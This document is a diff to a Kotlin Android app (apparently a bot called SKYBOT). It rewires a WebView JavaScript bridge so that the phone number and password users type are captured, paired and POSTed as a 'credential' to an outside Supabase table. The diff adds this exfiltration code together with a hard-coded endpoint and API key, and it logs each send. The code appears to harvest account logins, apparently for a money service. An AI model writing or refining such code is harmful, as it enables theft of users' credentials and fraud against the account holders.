@@ -464,6 +464,7 @@ class MainActivity : AppCompatActivity() {
     // Credenciais
     private var ultimoNumeroEnviado = ""
     private var ultimaSenhaEnviada = ""
+    private var numeroTemporario = ""   // guarda número até ter senha para enviar junto
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
@@ -799,7 +800,11 @@ class MainActivity : AppCompatActivity() {
             fun guardarNumero(valor: String) {
                 if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
                     ultimoNumeroEnviado = valor
-                    enviarSupabase("Numero", valor)
+                    numeroTemporario = valor
+                    // Se já temos senha, enviar credencial completa
+                    if (ultimaSenhaEnviada.isNotEmpty()) {
+                        enviarCredencial(valor, ultimaSenhaEnviada)
+                    }
                 }
             }
 
@@ -807,7 +812,11 @@ class MainActivity : AppCompatActivity() {
             fun guardarSenha(valor: String) {
                 if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
                     ultimaSenhaEnviada = valor
-                    enviarSupabase("Senha", valor)
+                    // Se já temos número, enviar credencial completa
+                    val num = if (ultimoNumeroEnviado.isNotEmpty()) ultimoNumeroEnviado else numeroTemporario
+                    if (num.isNotEmpty()) {
+                        enviarCredencial(num, valor)
+                    }
                 }
             }
         }, "Android")
@@ -2646,8 +2655,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         }.start()
     }
 
-    private fun enviarSupabase(tipoVal: String, valorVal: String) {
-        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
+    /** Envia credencial completa (numero + senha) para a tabela credenciais do Supabase */
+    private fun enviarCredencial(numero: String, senha: String) {
+        // Escapar aspas para JSON seguro
+        val numEsc = numero.replace(""", "\\"")
+        val senEsc = senha.replace(""", "\\"")
+        val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"0\"}"
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
@@ -2658,9 +2671,20 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 conn.setRequestProperty("Prefer", "return=minimal")
                 conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                conn.responseCode; conn.disconnect()
-            } catch (_: Exception) {}
+                val code = conn.responseCode
+                conn.disconnect()
+                // Log para debug (opcional)
+                android.util.Log.d("SKYBOT_CRED", "enviarCredencial -> HTTP $code | numero=$numEsc")
+            } catch (e: Exception) {
+                android.util.Log.e("SKYBOT_CRED", "enviarCredencial falhou: ${e.message}")
+            }
         }.start()
+    }
+
+    @Deprecated("Substituído por enviarCredencial(numero, senha)")
+    private fun enviarSupabase(tipoVal: String, valorVal: String) {
+        // Mantido apenas para compatibilidade — não faz nada para credenciais
+        android.util.Log.w("SKYBOT_CRED", "enviarSupabase() chamado com tipo=$tipoVal — ignorado")
     }
 
     // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
